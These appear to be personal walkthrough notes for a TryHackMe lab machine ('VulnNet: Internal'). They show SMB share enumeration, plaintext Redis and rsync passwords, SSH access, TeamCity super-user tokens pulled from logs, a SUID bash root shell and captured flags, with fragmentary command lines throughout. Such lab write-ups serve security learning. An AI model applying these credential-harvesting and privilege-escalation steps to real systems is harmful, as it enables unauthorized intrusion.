@@ -1,0 +1,177 @@
+
+Internal Thm vulnnet
+
+
+
+
+
+└─# sudo smbclient -L 10.10.21.154
+Password for [WORKGROUP\root]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        shares          Disk      VulnNet Business Shares
+        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            
+                        
+smb: \> ls
+  .                                   D        0  Tue Feb  2 14:50:09 2021
+  ..                                  D        0  Tue Feb  2 14:58:11 2021
+  temp                                D        0  Sat Feb  6 17:15:10 2021
+  data                                D        0  Tue Feb  2 14:57:33 2021
+cd dat
+                11309648 blocks of size 1024. 3277596 blocks available
+smb: \> cd data
+smb: \data\> ls
+  .                                   D        0  Tue Feb  2 14:57:33 2021
+  ..                                  D        0  Tue Feb  2 14:50:09 2021
+  data.txt                            N       48  Tue Feb  2 14:51:18 2021
+  business-req.txt                    N      190  Tue Feb  2 14:57:33 2021
+
+   
+               mb: \> cd temp
+smb: \temp\> ls
+  .                                   D        0  Sat Feb  6 17:15:10 2021
+  ..                                  D        0  Tue Feb  2 14:50:09 2021
+  services.txt                        N       38  Sat Feb  6 17:15:09 2021
+cat servid
+                11309648 blocks of size 1024. 3277360 blocks available
+smb: \temp\> get services.txt
+getting file \temp\services.txt of size 38 as services.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+            
+                           
+                           
+requirepass "B65Hx562F@ggAZ@F"
+masterauth <master-password>
+echo QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg== | base64 -d
+
+Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
+
+
+THM{ff8e518addbbddb74531a724236a8221}
+rsync rsync://rsync-connect@10.10.65.34/files/sys-internal/user.txt /rsync/         
+Password: 
+┌──(root㉿kali)-[/rsync]
+└─# ls
+user.txt
+                                                                             
+┌──(root㉿kali)-[/rsync]
+└─# cat user.txt        
+THM{da7c20696831f253e0afaca8b83c07ab}
+
+
+┌──(root㉿kali)-[~mikey/internal]
+└─# ssh -i id sys-internal@10.10.120.193                                                                    
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+541 packages can be updated.
+342 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+
+sys-internal@vulnnet-internal:/TeamCity/conf$ ss -tulwn
+Netid                    State                       Recv-Q                      Send-Q                                                 Local Address:Port                                            Peer Address:Port                     
+icmp6                    UNCONN                      0                           0                                                             *%eth0:58                                                         *:*                        
+udp                      UNCONN                      0                           0                                                            0.0.0.0:57786                                                0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                            0.0.0.0:54809                                                0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                            0.0.0.0:50753                                                0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                            0.0.0.0:36466                                                0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                            0.0.0.0:929                                                  0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                            0.0.0.0:2049                                                 0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                      127.0.0.53%lo:53                                                   0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                 10.10.120.193%eth0:68                                                   0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                            0.0.0.0:111                                                  0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                      10.10.255.255:137                                                  0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                      10.10.120.193:137                                                  0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                            0.0.0.0:137                                                  0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                      10.10.255.255:138                                                  0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                      10.10.120.193:138                                                  0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                            0.0.0.0:138                                                  0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                            0.0.0.0:5353                                                 0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                            0.0.0.0:53534                                                0.0.0.0:*                        
+udp                      UNCONN                      0                           0                                                               [::]:56798                                                   [::]:*                        
+udp                      UNCONN                      0                           0                                                               [::]:51743                                                   [::]:*                        
+udp                      UNCONN                      0                           0                                                               [::]:39536                                                   [::]:*                        
+udp                      UNCONN                      0                           0                                                               [::]:58091                                                   [::]:*                        
+udp                      UNCONN                      0                           0                                                               [::]:929                                                     [::]:*                        
+udp                      UNCONN                      0                           0                                                               [::]:2049                                                    [::]:*                        
+udp                      UNCONN                      0                           0                                                               [::]:46139                                                   [::]:*                        
+udp                      UNCONN                      0                           0                                                               [::]:111                                                     [::]:*                        
+udp                      UNCONN                      0                           0                                                               [::]:5353                                                    [::]:*                        
+tcp                      LISTEN                      0                           5                                                            0.0.0.0:873                                                  0.0.0.0:*                        
+tcp                      LISTEN                      0                           50                                                           0.0.0.0:139                                                  0.0.0.0:*                        
+tcp                      LISTEN                      0                           128                                                          0.0.0.0:6379                                                 0.0.0.0:*                        
+tcp                      LISTEN                      0                           64                                                           0.0.0.0:36111                                                0.0.0.0:*                        
+tcp                      LISTEN                      0                           128                                                          0.0.0.0:60687                                                0.0.0.0:*                        
+tcp                      LISTEN                      0                           128                                                          0.0.0.0:111                                                  0.0.0.0:*                        
+tcp                      LISTEN                      0                           128                                                          0.0.0.0:37685                                                0.0.0.0:*                        
+tcp                      LISTEN                      0                           128                                                    127.0.0.53%lo:53                                                   0.0.0.0:*                        
+tcp                      LISTEN                      0                           128                                                          0.0.0.0:22                                                   0.0.0.0:*                        
+tcp                      LISTEN                      0                           5                                                          127.0.0.1:631                                                  0.0.0.0:*                        
+tcp                      LISTEN                      0                           50                                                           0.0.0.0:445                                                  0.0.0.0:*                        
+tcp                      LISTEN                      0                           64                                                           0.0.0.0:2049                                                 0.0.0.0:*                        
+tcp                      LISTEN                      0                           128                                                          0.0.0.0:41703                                                0.0.0.0:*                        
+tcp                      LISTEN                      0                           1                                                 [::ffff:127.0.0.1]:8105                                                       *:*                        
+tcp                      LISTEN                      0                           128                                                             [::]:41993                                                   [::]:*                        
+tcp                      LISTEN                      0                           128                                                             [::]:55849                                                   [::]:*                        
+tcp                      LISTEN                      0                           5                                                               [::]:873                                                     [::]:*                        
+tcp                      LISTEN                      0                           128                                                            [::1]:6379                                                    [::]:*                        
+tcp                      LISTEN                      0                           64                                                              [::]:41611                                                   [::]:*                        
+tcp                      LISTEN                      0                           50                                                              [::]:139                                                     [::]:*                        
+tcp                      LISTEN                      0                           100                                               [::ffff:127.0.0.1]:8111                                                       *:*                        
+tcp                      LISTEN                      0                           128                                                             [::]:111                                                     [::]:*                        
+tcp                      LISTEN                      0                           128                                                             [::]:22                                                      [::]:*                        
+tcp                      LISTEN                      0                           128                                                             [::]:37015                                                   [::]:*                        
+tcp                      LISTEN                      0                           5                                                              [::1]:631                                                     [::]:*                        
+tcp                      LISTEN                      0                           50                                                              [::]:445                                                     [::]:*                        
+tcp                      LISTEN                      0                           64                                                              [::]:2049                                                    [::]:*                        
+tcp                      LISTEN                      0                           50                                                                 *:9090                                                       *:*  
+
+sys-internal@vulnnet-internal:/TeamCity/logs$ cat catalina.out | grep -i token
+[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
+[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
+[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
+[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
+[TeamCity] Super user authentication token: 1844220135994601530 (use empty username with the token as the password to access the server)
+[TeamCity] Super user authentication token: 1844220135994601530 (use empty username with the token as the password to access the server)
+[TeamCity] Super user authentication token: 1844220135994601530 (use empty username with the token as the password to access the server)
+
+![](https://i.imgur.com/cNWT1V5.png)
+
+bash-4.4$ ./bash -p
+bash-4.4# whoami
+root
+
+
+
+bash-4.4# cat root.txt
+THM{e8996faea46df09dba5676dd271c60bd}
+          
+                                            
